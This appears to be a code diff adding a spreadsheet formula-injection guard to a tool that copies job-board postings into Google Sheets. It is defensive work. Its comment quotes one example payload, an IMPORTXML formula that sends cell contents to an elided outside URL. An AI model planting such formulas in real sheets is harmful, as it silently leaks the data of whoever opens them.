@@ -314,6 +314,38 @@ export const headers = (tab) => tab.columns.map((c) => c.header);
  * company name, the rule's pattern. Everything after the last of those is
  * grid, not data.
  */
+/**
+ * A value that cannot become a formula when it lands in a cell.
+ *
+ * Everything on the matches tab is text somebody else wrote: a job title, a
+ * location, a company name, all lifted from a public job board. `setValues`
+ * evaluates a string beginning `=` as a formula, so a posting titled
+ * `=IMPORTXML("https://…"&A1,"//a")` becomes a live formula in the sheet of
+ * whoever watched that board — and IMPORTXML fetches on its own, with no click,
+ * carrying whatever it was pointed at. Nothing here ever writes a formula on
+ * purpose, so a leading formula character is always someone else's idea.
+ *
+ * The apostrophe is Sheets' own force-to-text prefix: it is consumed on the way
+ * in and does not come back out on a read, so a guarded value still compares
+ * equal to the posting it came from and no row reports a change it did not
+ * make.
+ */
+const FORMULA_LEAD = /^[=+\-@\t\r]/;
+
+export function safeCell(value) {
+  const text = String(value ?? '');
+  if (!FORMULA_LEAD.test(text)) return text;
+  // A negative number is a number. Quoting it would turn a salary floor into
+  // text and break every comparison downstream.
+  if (text.trim() !== '' && Number.isFinite(Number(text))) return text;
+  return `'${text}`;
+}
+
+/** The same, over a grid — what every write to a real sheet goes through. */
+export function safeValues(rows = []) {
+  return (rows || []).map((row) => (row || []).map(safeCell));
+}
+
 export function usedRows(bodyRows = [], keyIndex = 0) {
   let last = 0;
   bodyRows.forEach((row, i) => {
